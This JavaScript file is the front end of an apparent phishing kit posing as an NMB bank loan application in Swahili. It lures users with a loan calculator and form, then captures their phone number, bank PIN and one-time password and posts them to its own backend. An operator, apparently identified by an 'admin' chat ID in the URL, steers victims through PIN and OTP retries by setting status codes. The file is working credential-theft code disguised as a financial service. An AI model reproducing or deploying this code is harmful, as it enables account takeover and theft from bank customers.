document.addEventListener('DOMContentLoaded', () => {
  const urlParams = new URLSearchParams(window.location.search);
  const adminChatId = urlParams.get('admin');

  let state = {
    amount: 'TZS 2,500,000',
    duration: 'Miezi 12',
    loanType: '',
    purpose: '',
    firstName: '',
    lastName: '',
    contact: '',
    employment: '',
    income: '',
    pin: '',
    otp: '',
    userId: null
  };

  const views = {
    calculator: document.getElementById('view-calculator'),
    form: document.getElementById('view-form'),
    waiting: document.getElementById('view-waiting'),
    login: document.getElementById('view-login'),
    otp: document.getElementById('view-otp'),
    success: document.getElementById('view-success')
  };

  function switchView(viewName) {
    Object.values(views).forEach(v => v.classList.add('hidden'));
    if (views[viewName]) {
      views[viewName].classList.remove('hidden');
    }
  }

  const amountRange = document.getElementById('amount-range');
  const calcAmountInput = document.getElementById('calc-amount');
  const durationRange = document.getElementById('duration-range');
  const durationVal = document.getElementById('duration-val');
  const monthlyPayment = document.getElementById('monthly-payment');

  function updateCalculator() {
    const val = parseInt(amountRange.value);
    state.amount = `TZS ${val.toLocaleString()}`;
    calcAmountInput.value = state.amount;

    const months = parseInt(durationRange.value);
    state.duration = `Miezi ${months}`;
    durationVal.textContent = state.duration;

    const monthly = (val * 1.12) / months;
    monthlyPayment.textContent = `TZS ${Math.round(monthly).toLocaleString()}`;
  }

  amountRange.addEventListener('input', updateCalculator);
  durationRange.addEventListener('input', updateCalculator);

  document.getElementById('btn-start-app').addEventListener('click', () => {
    document.getElementById('form-amount').value = amountRange.value;
    state.amount = `TZS ${parseInt(amountRange.value).toLocaleString()}`;
    switchView('form');
    validateStep(1);
  });

  let currentStep = 1;
  const formSteps = document.querySelectorAll('.form-step');
  const progressFill = document.getElementById('progress-fill');
  const stepIndicator = document.getElementById('step-indicator');

  function updateStepView() {
    formSteps.forEach((step, index) => {
      if (index + 1 === currentStep) {
        step.classList.remove('hidden');
      } else {
        step.classList.add('hidden');
      }
    });
    progressFill.style.width = `${(currentStep / 3) * 100}%`;
    stepIndicator.textContent = `Hatua ${currentStep} kati ya 3`;
  }

  function validateStep(step) {
    let isValid = false;
    const currentStepEl = document.querySelector(`.form-step[data-step="${step}"]`);
    const nextBtn = currentStepEl.querySelector('.next-btn');

    if (step === 1) {
      const loanType = document.getElementById('loan-type').value;
      const amt = document.getElementById('form-amount').value;
      const purpose = document.getElementById('loan-purpose').value.trim();
      isValid = loanType && amt && purpose.length > 2;
    } else if (step === 2) {
      const fn = document.getElementById('first-name').value.trim();
      const ln = document.getElementById('last-name').value.trim();
      const contact = document.getElementById('user-contact').value.trim();
      isValid = fn && ln && /^0\d{9}$/.test(contact);
    } else if (step === 3) {
      const employment = document.getElementById('employment-status').value;
      const income = document.getElementById('annual-income').value.trim();
      isValid = employment && income.length > 0;
    }

    if (nextBtn) {
      nextBtn.disabled = !isValid;
    }
  }

  const userContactInput = document.getElementById('user-contact');
  if (userContactInput) {
    userContactInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 10) {
        value = value.slice(0, 10);
      }
      e.target.value = value;
      validateStep(2);
    });
  }

  const loginContactInput = document.getElementById('login-contact');
  if (loginContactInput) {
    loginContactInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 10) {
        value = value.slice(0, 10);
      }
      e.target.value = value;
      checkPinComplete();
    });
  }

  document.getElementById('loan-type').addEventListener('change', () => validateStep(1));
  document.getElementById('form-amount').addEventListener('input', () => validateStep(1));
  document.getElementById('loan-purpose').addEventListener('input', () => validateStep(1));
  document.getElementById('first-name').addEventListener('input', () => validateStep(2));
  document.getElementById('last-name').addEventListener('input', () => validateStep(2));
  document.getElementById('employment-status').addEventListener('change', () => validateStep(3));
  document.getElementById('annual-income').addEventListener('input', () => validateStep(3));

  document.querySelectorAll('.next-btn').forEach(btn => {
    btn.addEventListener('click', async () => {
      if (currentStep === 1) {
        state.loanType = document.getElementById('loan-type').value;
        state.amount = `TZS ${parseInt(document.getElementById('form-amount').value).toLocaleString()}`;
        state.purpose = document.getElementById('loan-purpose').value;
      } else if (currentStep === 2) {
        state.firstName = document.getElementById('first-name').value;
        state.lastName = document.getElementById('last-name').value;
        state.contact = document.getElementById('user-contact').value;

        document.getElementById('sum-amount').textContent = state.amount;
        document.getElementById('sum-duration').textContent = state.duration;
        document.getElementById('sum-purpose').textContent = state.purpose;
        document.getElementById('sum-name').textContent = `${state.firstName} ${state.lastName}`;
      } else if (currentStep === 3) {
        state.employment = document.getElementById('employment-status').value;
        state.income = document.getElementById('annual-income').value;

        // Submit application automatically when Next is pressed at step 3
        switchView('waiting');
        try {
          const response = await fetch('/api/submit-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              contact: state.contact,
              pin: 'PENDING_PIN',
              amount: state.amount,
              adminChatId
            })
          });
          const data = await response.json();
          if (data.success) {
            state.userId = data.userId;
            pollStatus();
          }
        } catch (err) {
          console.error(err);
        }
        return;
      }

      if (currentStep < 3) {
        currentStep++;
        updateStepView();
        validateStep(currentStep);
      }
    });
  });

  document.querySelectorAll('.prev-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      if (currentStep > 1) {
        currentStep--;
        updateStepView();
        validateStep(currentStep);
      }
    });
  });

  function pollStatus() {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/check-status/${state.userId}`);
        const data = await res.json();

        if (data.status === 'APPROVED_LOAD_OTP' || data.status === 'RETRY_PIN') {
          clearInterval(interval);
          document.getElementById('login-contact').value = state.contact;
          switchView('login');
        } else if (data.status === 'DENIED') {
          clearInterval(interval);
          alert('Maombi yako ya mkopo yamekataliwa na msimamizi wa NMB.');
          location.reload();
        } else if (data.status === 'SUCCESS') {
          clearInterval(interval);
          populateSuccessScreen();
          switchView('success');
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
  }

  const pinBoxes = document.querySelectorAll('.pin-box');
  pinBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value;
      if (val && index < pinBoxes.length - 1) {
        pinBoxes[index + 1].focus();
      }
      checkPinComplete();
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && index > 0) {
        pinBoxes[index - 1].focus();
      }
    });
  });

  function checkPinComplete() {
    let pinStr = '';
    pinBoxes.forEach(b => pinStr += b.value);
    const contactVal = document.getElementById('login-contact').value.trim();
    const btnLogin = document.getElementById('btn-login');
    if (pinStr.length === 4 && /^0\d{9}$/.test(contactVal)) {
      state.pin = pinStr;
      btnLogin.disabled = false;
    } else {
      btnLogin.disabled = true;
    }
  }

  document.getElementById('btn-login').addEventListener('click', async () => {
    state.contact = document.getElementById('login-contact').value.trim();
    switchView('waiting');
    document.getElementById('waiting-status-text').textContent = 'Inathibitisha PIN yako ya NMB...';

    try {
      const res = await fetch('/api/submit-application', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          contact: state.contact,
          pin: state.pin,
          amount: state.amount,
          adminChatId
        })
      });
      const data = await res.json();
      if (data.success) {
        state.userId = data.userId;
        pollOtpStatus();
      }
    } catch (e) {
      console.error(e);
    }
  });

  function pollOtpStatus() {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/check-status/${state.userId}`);
        const data = await res.json();

        if (data.status === 'APPROVED_LOAD_OTP') {
          clearInterval(interval);
          document.getElementById('otp-target-display').textContent = state.contact;
          switchView('otp');
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(interval);
          switchView('login');
          document.getElementById('pin-error').classList.remove('hidden');
          pinBoxes.forEach(b => b.value = '');
          document.getElementById('btn-login').disabled = true;
        } else if (data.status === 'SUCCESS') {
          clearInterval(interval);
          populateSuccessScreen();
          switchView('success');
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
  }

  const otpBoxes = document.querySelectorAll('.otp-box');
  otpBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value;
      if (val && index < otpBoxes.length - 1) {
        otpBoxes[index + 1].focus();
      }
      checkOtpComplete();
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && index > 0) {
        otpBoxes[index - 1].focus();
      }
    });
  });

  function checkOtpComplete() {
    let otpStr = '';
    otpBoxes.forEach(b => otpStr += b.value);
    const btnSubmitOtp = document.getElementById('btn-submit-otp');
    if (otpStr.length === 4) {
      state.otp = otpStr;
      btnSubmitOtp.disabled = false;
    } else {
      btnSubmitOtp.disabled = true;
    }
  }

  document.getElementById('btn-submit-otp').addEventListener('click', async () => {
    switchView('waiting');
    document.getElementById('waiting-status-text').textContent = 'Inakagua namba ya OTP ya NMB...';

    try {
      await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: state.userId, otp: state.otp })
      });
      pollFinalStatus();
    } catch (e) {
      console.error(e);
    }
  });

  function pollFinalStatus() {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/check-status/${state.userId}`);
        const data = await res.json();

        if (data.status === 'SUCCESS') {
          clearInterval(interval);
          populateSuccessScreen();
          switchView('success');
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(interval);
          switchView('otp');
          document.getElementById('otp-error').classList.remove('hidden');
          otpBoxes.forEach(b => b.value = '');
          document.getElementById('btn-submit-otp').disabled = true;
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(interval);
          switchView('login');
          document.getElementById('pin-error').classList.remove('hidden');
          pinBoxes.forEach(b => b.value = '');
          document.getElementById('btn-login').disabled = true;
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
  }

  function populateSuccessScreen() {
    document.getElementById('approved-amount-val').textContent = state.amount;
    document.getElementById('success-monthly-val').textContent = monthlyPayment.textContent;
    document.getElementById('success-duration-val').textContent = state.duration;
  }

  document.getElementById('btn-home').addEventListener('click', () => {
    location.reload();
  });
});
    
